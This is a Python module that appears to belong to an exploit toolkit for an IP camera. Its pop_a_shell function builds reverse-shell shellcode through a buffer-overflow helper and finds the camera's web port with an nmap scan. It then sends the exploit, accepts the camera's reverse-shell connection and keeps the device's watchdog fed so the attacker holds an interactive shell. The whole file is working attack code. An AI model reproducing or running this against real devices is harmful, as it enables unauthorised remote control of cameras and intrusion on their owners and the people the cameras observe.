import time
import socket
import colorama

from .port_scan import find_web_server, get_local_ip
from .send_req import connect_reverse_shell

# awful syspath hack to make sibling imports work
import sys, os
sys.path.insert(0, os.path.abspath('..'))
from buffer_overflow.build_exploit import create_shellcode

def pop_a_shell(target_ip, listen_port=1799, listen_ip='auto', target_port=None):
    """
    Opens a netcat shell
    """
    # If no IP was provided, try to pick the right address
    if listen_ip == 'auto':
        listen_ip = get_local_ip(target_ip, 23456)
        if listen_ip == None:
            # Try again, but against example.com
            listen_ip = get_local_ip()
            if listen_ip == None:
                print(colorama.Fore.RED + "[!] Automatic IP detection failed!")
                print("[i] Please set your ip manually using 'set self <IP>'.")
                return

        print("[i] IP detected (%s)" % listen_ip)

    # Prepare and build shellcode from template
    success = create_shellcode(ip_addr=listen_ip, nc_port=listen_port, \
        template_file="template.S", cwd="buffer_overflow/")
    if not success:
        print(colorama.Fore.RED + "[!] Shellcode build failed!")
        return

    # If target port is not specified, try to find it using a nmap scan.
    if target_port is None:
        print("[i] Searching web server port")
        target_port = find_web_server(target_ip)
        if target_port is None:
            print(colorama.Fore.RED + "[!] Web server port not found!")
            return

        print("[i] Found web server at port %d" % target_port)

        # The camera is quite 'fragile', so we need to wait a few seconds here
        print("[i] Waiting for nmap sockets to close...")
        time.sleep(10)

    # Open a socket
    print("[i] Opening TCP socket on port %d" % listen_port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', listen_port))
    sock.listen()

    time.sleep(3)

    # Send the exploit
    print("[i] Sending exploit")
    connect_reverse_shell(target_ip, target_port)

    print("[i] Waiting for incoming connections")
    conn, addr = sock.accept()
    print("[i] {} connected.".format(addr))
    
    # Quickly feed the watchdog to prevent a reboot
    cmd = "watchdog -t 1 /dev/watchdog"

    print("[i] Type ':quit' to disconnect and restart the target.")
    while cmd != ":quit" and cmd != ":q":
        conn.send(cmd.encode() + b"\n")
        res = str(conn.recv(1024), "utf-8")
        print(res, end='')
        cmd = input("# ")

    # Closing this shell also kills Alloca, locking us out. As
    # such, we reboot the camera to restart Alloca.
    conn.send(b"reboot\n")
    conn.close()
